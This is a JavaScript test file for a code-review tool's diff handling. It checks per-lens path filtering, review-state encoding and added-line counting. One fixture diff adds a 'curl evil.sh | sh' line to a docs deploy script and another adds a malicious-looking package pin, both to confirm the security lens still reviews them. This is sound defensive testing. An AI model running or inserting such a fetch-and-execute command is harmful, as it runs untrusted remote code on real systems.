#!/usr/bin/env node
import assert from "node:assert/strict";
import {
  REVIEW_STATE_MARKER,
  buildReviewState,
  countAddedLines,
  diffPaths,
  lensCanReviewDiff,
  parseReviewState,
  shouldWriteReviewState,
} from "./review-delta.mjs";

const sha = "a".repeat(40);
const sourceDiff = "diff --git a/src/app.ts b/src/app.ts\n--- a/src/app.ts\n+++ b/src/app.ts\n+return true;\n";
const docsDiff = "diff --git a/README.md b/README.md\n--- a/README.md\n+++ b/README.md\n+details\n";
const lockDiff = "diff --git a/package-lock.json b/package-lock.json\n--- a/package-lock.json\n+++ b/package-lock.json\n+dependency\n";
const svgDiff = "diff --git a/icon.svg b/icon.svg\n--- a/icon.svg\n+++ b/icon.svg\n+script\n";
const oldStyleFilter = JSON.stringify({ correctness: "\\.(?:md|txt)$", performance: "\\.(?:md|txt)$" });

assert.deepEqual(diffPaths(sourceDiff), ["src/app.ts"]);
assert.deepEqual(diffPaths("diff --git a/src/removed.ts b/src/removed.ts\n--- a/src/removed.ts\n+++ /dev/null\n"), ["src/removed.ts"]);
// Empty filter is the default: every configured lens remains dispatched,
// including the markdown-product paths that the old hardcoded regex skipped.
assert.equal(lensCanReviewDiff("performance", sourceDiff), true);
assert.equal(lensCanReviewDiff("performance", docsDiff), true);
assert.equal(lensCanReviewDiff("scope", docsDiff), true);
assert.equal(lensCanReviewDiff("security", docsDiff), true);
assert.equal(lensCanReviewDiff("performance", docsDiff, oldStyleFilter), false);
// A consumer's opt-in filter is per lens, so security keeps seeing paths that
// are not executable source unless the consumer explicitly filters them too.
assert.equal(lensCanReviewDiff("security", lockDiff), true);
assert.equal(lensCanReviewDiff("security", svgDiff), true);
assert.equal(lensCanReviewDiff("security", docsDiff, oldStyleFilter), true);
assert.equal(lensCanReviewDiff("security", docsDiff, JSON.stringify({ security: "\\.(?:md|txt)$" })), false);
assert.equal(shouldWriteReviewState(true), true);
assert.equal(shouldWriteReviewState(false), false);
assert.equal(shouldWriteReviewState(undefined), false);

// A dependency manifest is not prose, even with a `.txt` extension, and
// must stay reviewable by the security lens.
const manifestDiff = "diff --git a/requirements.txt b/requirements.txt\n--- a/requirements.txt\n+++ b/requirements.txt\n+evil-pkg==1.0.0\n";
assert.equal(lensCanReviewDiff("security", manifestDiff), true);
// A `docs/` directory can hold an executable, not just prose.
const docsScriptDiff = "diff --git a/docs/deploy.sh b/docs/deploy.sh\n--- a/docs/deploy.sh\n+++ b/docs/deploy.sh\n+curl evil.sh | sh\n";
assert.equal(lensCanReviewDiff("security", docsScriptDiff), true);

const state = buildReviewState(sha, "## unresolved\n\nKeep this finding.");
assert.match(state, new RegExp(`^${REVIEW_STATE_MARKER}`));
assert.equal(state.split("\n").length, 4);
assert.equal(state.split("\n")[2].includes("\n"), false);
assert.deepEqual(parseReviewState(state), {
  sha,
  carry: "## unresolved\n\nKeep this finding.",
});
const encoded = state.split("\n")[2].slice(6);
const wrappedState = state.replace(`carry:${encoded}`, `carry:${encoded.slice(0, 8)}\n${encoded.slice(8)}`);
assert.deepEqual(parseReviewState(wrappedState), {
  sha,
  carry: "## unresolved\n\nKeep this finding.",
});
assert.equal(parseReviewState(state.replace("carry:", "broken:")), null);
assert.equal(parseReviewState("not a state comment"), null);

assert.equal(countAddedLines(sourceDiff), 1);
// A real added line whose content itself starts with `++` renders as
// `+++counter;` (no space), which must still count as content, not be
// mistaken for a `+++ b/path` file header.
const plusPlusDiff = "diff --git a/src/x.ts b/src/x.ts\n--- a/src/x.ts\n+++ b/src/x.ts\n+++counter;\n+return true;\n";
assert.equal(countAddedLines(plusPlusDiff), 2);
assert.equal(countAddedLines(""), 0);

console.log("review delta tests passed");
